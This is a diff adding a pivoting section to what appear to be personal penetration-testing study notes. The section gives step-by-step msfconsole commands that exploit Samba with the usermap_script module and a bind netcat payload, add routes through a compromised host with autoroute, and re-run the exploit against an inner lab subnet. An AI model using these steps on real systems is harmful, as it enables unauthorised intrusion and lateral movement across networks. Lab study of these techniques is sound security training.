@@ -1802,6 +1802,74 @@ Post Exploitation Part (3)
 Pivoting
 --------
 
+(Hacker PC--------[---------Target PC--------)---------PCs within Target Network]
+10.20.14.10                 10.20.14.11, 10.20.15.11        10.20.15.12
+10.20.15.10
+
+"Hacker PC can ping each other with Target PC"
+"Target PC can ping each other with PCs within Target Network"
+"But Target PC cannot ping each other with PCs within Target Network"
+
+. Setup a Route between Hacker and Target Device
+. Give Hacker accesses to Devices over Target Network
+. Use Metasploit exploits auxiliaries ...etc
+
+- Use it (> use post/windows/manage/autoroute)
+- Set Subnet of Target Network (> set subnet subnet_address)
+- Set Session ID (> set session session_id)
+- Exploit (> exploit)
+
+"Let practice in msfconsole"
+
+>> sessions -l
+
+"Show session with 10.20.14.~"
+
+>> use exploit/multi/samba/usermap_script
+>> show options
+
+>> set RHOST 10.20.15.10
+>> show payloads
+>> set PAYLOAD cmd/unix/bind_netcat
+>> show options
+
+>> exploit
+
+"10.20.15.10 exploit fail because of connection time out"
+
+"Interact to Session ID with 10.20.14.~"
+
+>> sessions -i session_id
+
+meterpreter > ifconfig
+
+"The following here is logic"
+- Use it (> use post/windows/manage/autoroute)
+- Set Subnet of Target Network (> set subnet subnet_address)
+- Set Session ID (> set session session_id)
+- Exploit (> exploit)
+
+>> use post/windows/manage/
+>> use post/windows/manage/autoroute
+
+>> show options
+>> set SUBNET 10.20.15.0
+>> set SESSION session_id
+>> exploit
+
+[*] Route added to subnet 10.20.14.0/255.255.255.0 from host's routing table.
+[*] Route added to subnet 10.20.15.0/255.255.255.0 from host's routing table.
+
+>> use exploit/multi/samba/usermap_script
+>> show options
+
+>> exploit
+
+>> background
+>> sessions
+>> sessions -i session_id
+
+--------------------------------------------------------------------------------------------------------------------------------------------
 
 
 
